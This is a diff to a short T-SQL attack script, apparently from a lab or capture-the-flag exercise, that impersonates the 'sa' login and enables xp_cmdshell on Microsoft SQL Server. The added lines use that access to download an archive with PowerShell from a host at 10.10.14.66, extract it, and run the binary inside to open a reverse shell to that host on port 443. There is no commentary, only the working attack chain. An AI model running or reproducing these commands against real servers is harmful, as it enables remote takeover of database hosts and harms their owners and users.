@@ -1,6 +1,12 @@
+ 
 execute as login = 'sa'
 execute sp_configure 'show advanced options', '1'
 RECONFIGURE
 execute sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 execute xp_cmdshell "whoami"
+
+
+execute xp_cmdshell 'powershell iwr -uri http://10.10.14.66:8000/rcat.zip -outfile c:\temp\rcat.zip'
+execute xp_cmdshell 'powershell cd c:\temp\; Expand-Archive -Force c:\temp\rcat.zip; ls '
+execute xp_cmdshell 'powershell  c:\temp\rcat\rcat.exe 10.10.14.66 443 -e cmd '
